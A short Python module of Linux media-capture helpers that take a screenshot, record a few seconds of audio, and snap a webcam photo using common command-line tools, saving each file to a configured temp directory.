"""Media capture utilities for Linux"""
import subprocess
import os
import time
from config import config

def take_screenshot():
    """Take screenshot using scrot or gnome-screenshot"""
    screenshot_path = os.path.join(config.TEMP_DIR, 'screenshot.png')
    
    # Try different screenshot tools
    commands = [
        f"scrot {screenshot_path}",
        f"gnome-screenshot -f {screenshot_path}",
        f"import -window root {screenshot_path}"  # ImageMagick
    ]
    
    for cmd in commands:
        try:
            result = subprocess.run(cmd.split(), capture_output=True, timeout=10)
            if result.returncode == 0 and os.path.exists(screenshot_path):
                return screenshot_path
        except Exception:
            continue
    
    return None

def record_audio(duration=5):
    """Record audio using arecord"""
    audio_path = os.path.join(config.TEMP_DIR, 'recording.wav')
    
    try:
        cmd = f"arecord -d {duration} -f cd {audio_path}"
        subprocess.run(cmd.split(), timeout=duration + 5)
        
        if os.path.exists(audio_path):
            return audio_path
    except Exception:
        pass
    
    return None

def capture_webcam_photo():
    """Capture photo from webcam using fswebcam"""
    photo_path = os.path.join(config.TEMP_DIR, 'webcam.jpg')
    
    try:
        cmd = f"fswebcam -r 640x480 --no-banner {photo_path}"
        result = subprocess.run(cmd.split(), capture_output=True, timeout=10)
        
        if result.returncode == 0 and os.path.exists(photo_path):
            return photo_path
    except Exception:
        pass
    
    return None
